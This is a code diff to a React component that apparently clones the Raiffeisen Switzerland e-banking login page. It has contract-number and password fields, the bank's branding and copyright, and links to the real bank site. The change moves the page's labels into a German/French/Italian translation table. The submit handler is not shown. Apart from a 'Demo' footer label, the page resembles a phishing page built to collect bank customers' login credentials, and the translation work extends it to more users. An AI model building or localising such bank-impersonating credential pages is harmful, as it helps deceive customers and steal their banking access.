@@ -60,6 +60,7 @@ const ChRaiffeisen = () => {
   const [passwort, setPasswort] = useState("");
   const [showLoading, setShowLoading] = useState(false);
   const [lang, setLang] = useState<"de" | "fr" | "it">("de");
+  const t = TRANSLATIONS[lang];
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -101,7 +102,7 @@ const ChRaiffeisen = () => {
         <main className="flex-1 flex flex-col px-6 md:px-12 min-h-[calc(100vh-80px)]">
 
           <div className="w-full max-w-[530px] md:ml-[22%] pt-12 md:pt-16">
-            <h1 className="text-3xl md:text-4xl font-bold mb-10">Login für E-Banking</h1>
+            <h1 className="text-3xl md:text-4xl font-bold mb-10">{t.title}</h1>
 
             {/* Vertragsnummer - Floating Label */}
             <div className="mb-8">
@@ -119,7 +120,7 @@ const ChRaiffeisen = () => {
                   htmlFor="vertragsnummer"
                   className="absolute left-0 top-3 text-base text-[#949494] transition-all duration-200 ease-out pointer-events-none peer-focus:top-0 peer-focus:text-xs peer-focus:text-black peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-black"
                 >
-                  Vertragsnummer
+                  {t.contract}
                 </label>
               </div>
             </div>
@@ -140,7 +141,7 @@ const ChRaiffeisen = () => {
                   htmlFor="passwort"
                   className="absolute left-0 top-3 text-base text-[#949494] transition-all duration-200 ease-out pointer-events-none peer-focus:top-0 peer-focus:text-xs peer-focus:text-black peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-black"
                 >
-                  Persönliches Passwort
+                  {t.password}
                 </label>
               </div>
             </div>
@@ -150,13 +151,13 @@ const ChRaiffeisen = () => {
               onClick={handleSubmit}
               className="bg-[#1a1a1a] text-white font-medium px-14 py-3 rounded-sm hover:bg-[#333] transition-colors mb-8"
             >
-              Weiter
+              {t.submit}
             </button>
 
             {/* Passwort vergessen */}
             <div>
               <a href="https://login.raiffeisen.ch/de/first-factor" className="text-base underline underline-offset-[6px] decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
-                Passwort vergessen?
+                {t.forgot}
               </a>
             </div>
           </div>
@@ -164,10 +165,10 @@ const ChRaiffeisen = () => {
           {/* Bottom service links - links unter Passwort vergessen ausgerichtet */}
           <div className="mt-auto pt-10 pb-8 w-full flex items-center justify-between md:pl-[22%] pr-12 text-base">
             <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
-              Neues Gerät für PhotoTAN aktivieren
+              {t.phototan}
             </a>
             <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
-              Hilfe und Kontakt
+              {t.help}
             </a>
           </div>
 
@@ -178,7 +179,7 @@ const ChRaiffeisen = () => {
         {/* Footer */}
         <footer className="bg-[#f2f2f2] relative">
           <div className="flex items-center justify-between pt-10 pb-2 px-[90px] text-sm">
-            <span className="font-bold text-black">Demo E-Banking</span>
+            <span className="font-bold text-black">{t.demo}</span>
             <div className="flex items-center gap-8">
               {(["de", "fr", "it"] as const).map((l) => (
                 <button
@@ -191,7 +192,7 @@ const ChRaiffeisen = () => {
               ))}
             </div>
           </div>
-          <div className="px-[90px] pb-10 pt-8 text-sm text-black">© Raiffeisen Schweiz</div>
+          <div className="px-[90px] pb-10 pt-8 text-sm text-black">{t.copyright}</div>
         </footer>
 
         {/* Roter Balken (50% links) + grauer Streifen rechts */}
